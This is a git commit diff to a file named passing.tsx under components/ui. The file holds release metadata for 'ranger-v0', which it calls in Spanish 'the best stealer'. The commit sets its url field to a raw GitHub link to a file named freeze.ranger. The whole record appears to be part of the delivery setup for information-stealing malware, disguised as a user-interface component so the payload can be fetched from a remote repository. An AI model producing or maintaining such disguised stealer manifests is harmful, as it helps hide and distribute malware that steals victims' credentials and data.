bc05ac0064e9650b0ba2b0178fd3e5ba20691452
Pabloescobarxde <Pabloescobar20peto@gmail.com>
2026-04-15 12:23:00 +0100

    Update passing.tsx

--- components/ui/passing.tsx
+++ components/ui/passing.tsx
@@ -2,5 +2,5 @@
   "version": "1.0.2",
   "description": "Primera Release de ranger-v0. El mejor stealer",
   "last_update": "2026-04-14",
-  "url": "working"
+  "url": "https://raw.githubusercontent.com/Pabloescobarxde/AstroChatting/main/components/ui/freeze.ranger"
 }
